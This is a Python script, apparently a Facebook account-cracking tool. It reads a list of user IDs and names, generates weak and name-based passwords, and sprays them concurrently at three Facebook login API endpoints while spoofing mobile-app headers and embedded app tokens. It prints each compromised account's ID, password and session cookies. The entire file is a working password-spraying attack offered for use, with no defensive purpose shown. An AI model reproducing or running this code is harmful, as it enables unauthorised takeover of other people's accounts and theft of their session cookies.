import os,json,time,uuid,sys,random,base64,shutil,re, requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool

line="—"*30
limit=50
logo="""
    ┏┳┓┏┓┏┓┏┳┓
     ┃ ┣ ┗┓ ┃ 
     ┻ ┗┛┗┛ ┻"""


def rn():
    pwx=["00998877","321321","Last123","Fast123","fast123","@1234576@","@123456@","@12345@","@1234@","09876543","00998877","@@@@####"]
    os.system("clear")
    print(logo)
    print(line)
    try:
        print(" Example /sdcard/id.txt")
        user=open(input(" file_path:"),"r").read().splitlines()
    except:
        rn()
    limit=len(user)
    print(line)
    
    with ThreadPool(max_workers=45) as heron:
        os.system("clear")
        print(logo)
        print(line)
        print("[1] Method API")
        print("[2] Method GRAPH")
        print("[3] Method B-GRAPH")
        print(line)
        me=input("_-")
        print(line)
        ua=input(" Inject Ua ~> ")
        os.system("clear")
        device=ua.split("FBBD/")[1].split(";")[0].upper()
        os.system("clear")
        print(logo)
        print(line)
        print(" Total Id "+str(limit)+"|Pas"+str(len(pwx)))
        print(" Ua Device ~> "+device)
        print(line)
        
        for xd in user:
            uid,names=xd.split("|")
            if me in ["1"]:
                heron.submit(test_1,uid,names,pwx,ua)
            elif me in ["2"]:
                heron.submit(test_2,uid,names,pwx,ua)
            else:
            
                heron.submit(test_3,uid,names,pwx,ua)


loop=0
oks=[]


def test_1(uid,names,pwx,ua):
    global loop,oks,limit
    
    sys.stdout.write(f'\r  \033[1;37m~/ [SAVAGE-API\033[1;37m] \033[1;37m<[\033[1;1m{loop}\033[1;00m\033[1;37m]> <[\033[1;37m\033[1;1m\033[1;32m{str(len(oks))}\033[1;00m\033[1;37m]>\033[0;00m\r');sys.stdout.flush()
    
    try:
        for pw in pwx:
            f1,l1=names.split(" ")
            ps=pw.replace("first",f1.lower()).replace("First",f1).replace("FIRST",f1.upper()).replace("last",l1.lower()).replace("LAST",l1.upper()).replace("Last",l1).replace("name",names.lower()).replace("Name",names)
            add_ua=f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';'
            data = {'adid':str(uuid.uuid4()),
                'email':uid,
                'password':ps,
                'cpl':'true',
                'credentials_type':'device_based_login_password',
                "source": "device_based_login",
                'error_detail_type':'button_with_disabled',
                'source':'login',
                'format':'json',
                'generate_session_cookies':'1',
                'generate_analytics_claim':'1',
                'generate_machine_id':'1',
                "locale":"en_US",
                "client_country_code":"US",
                'device':'',
                'device_id':str(uuid.uuid4()),
                "method": "auth.login",
                "fb_api_req_friendly_name": "authenticate",
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
            head = {
                'content-type':'application/x-www-form-urlencoded',
                'x-fb-sim-hni':str(random.randint(2e4,4e4)),
                'x-fb-connection-type':'unknown',
                'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'user-agent':add_ua+ua,
                'x-fb-net-hni':str(random.randint(2e4,4e4)),
                'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                'x-fb-connection-quality':'EXCELLENT',
                'x-fb-friendly-name':'authenticate',
                'accept-encoding':'gzip, deflate',
                'x-fb-http-engine':'Liger'}
            url= 'https://api.facebook.com/method/auth.login'
            rq=requests.post(url,data=data,headers=head).json()
            if "session_key" in rq:
                xd=str(rq["uid"])
                coki=";".join(i["name"]+"="+i["value"] for i in rq["session_cookies"])
                print(f"\r\r [OK] {xd} | {ps}| {coki}")
                oks.append(xd)
                
                
                break
            
            else:
                continue
        loop+=1
        if limit<loop:
            sys.exit()
    except Exception as e:
        #print(e)
        time.sleep(50)


def test_2(uid,names,pwx,ua):
    global loop,oks
    
    sys.stdout.write(f'\r  \033[1;37m~/ [SAVAGE-GRAPH\033[1;37m] \033[1;37m<[\033[1;1m{loop}\033[1;00m\033[1;37m]> <[\033[1;37m\033[1;1m\033[1;32m{str(len(oks))}\033[1;00m\033[1;37m]>\033[0;00m\r');sys.stdout.flush()
    
    try:
        for pw in pwx:
            f1,l1=names.split(" ")
            ps=pw.replace("first",f1.lower()).replace("First",f1).replace("FIRST",f1.upper()).replace("last",l1.lower()).replace("LAST",l1.upper()).replace("Last",l1).replace("name",names.lower()).replace("Name",names)
            add_ua=f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';'
            token="350685531728%7C62f8ce9f74b12f84c123cc23437a4a32"
            adi=str(uuid.uuid4())
            data = {"adid": adi,"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email": uid,"password": ps,"access_token": token,"generate_session_cookies": "1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_GB","client_country_code": "GB","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
            head = {
                'User-Agent': ua+add_ua,
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'Connection':'keep-alive',
                'X-FB-Connection-Bandwidth': str(random.randint(20000000, 30000000)),
                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'X-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                'X-fb-device-group': str(random.randint(2000, 4000)),
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'X-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
            url=f'https://graph.facebook.com/auth/login'
            rq=requests.post(url,data=data,headers=head).json()
            
            if "session_key" in rq:
                xd=str(rq["uid"])
                coki=";".join(i["name"]+"="+i["value"] for i in rq["session_cookies"])
                print(f"\r\r [OK] {xd} | {ps}| {coki}")
                oks.append(xd)
                break
            
            else:
                continue
        loop+=1
    except Exception as e:
        #print(e)
        time.sleep(50)


def test_3(uid,names,pwx,ua):
    global loop,oks
    
    sys.stdout.write(f'\r  \033[1;37m~/ [SAVAGE-BGRAPH\033[1;37m] \033[1;37m<[\033[1;1m{loop}\033[1;00m\033[1;37m]> <[\033[1;37m\033[1;1m\033[1;32m{str(len(oks))}\033[1;00m\033[1;37m]>\033[0;00m\r');sys.stdout.flush()
    
    try:
        for pw in pwx:
            f1,l1=names.split(" ")
            ps=pw.replace("first",f1.lower()).replace("First",f1).replace("FIRST",f1.upper()).replace("last",l1.lower()).replace("LAST",l1.upper()).replace("Last",l1).replace("name",names.lower()).replace("Name",names)
            add_ua=f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';'
            token="350685531728%7C62f8ce9f74b12f84c123cc23437a4a32"
            adi=str(uuid.uuid4())
            data = {"adid": adi,"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email": uid,"password": ps,"access_token": token,"generate_session_cookies": "1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_GB","client_country_code": "GB","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
            head = {
                'User-Agent': ua+add_ua,
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'Connection':'keep-alive',
                'X-FB-Connection-Bandwidth': str(random.randint(20000000, 30000000)),
                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'X-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                'X-fb-device-group': str(random.randint(2000, 4000)),
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'X-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
            url=f'https://b-graph.facebook.com/auth/login'
            rq=requests.post(url,data=data,headers=head).json()
            if "session_key" in rq:
                xd=str(rq["uid"])
                coki=";".join(i["name"]+"="+i["value"] for i in rq["session_cookies"])
                print(f"\r\r [OK] {xd} | {ps}| {coki}")
                oks.append(xd)
                break
            
            else:
                continue
        loop+=1
    except Exception as e:
        #print(e)
        time.sleep(50)




rn()



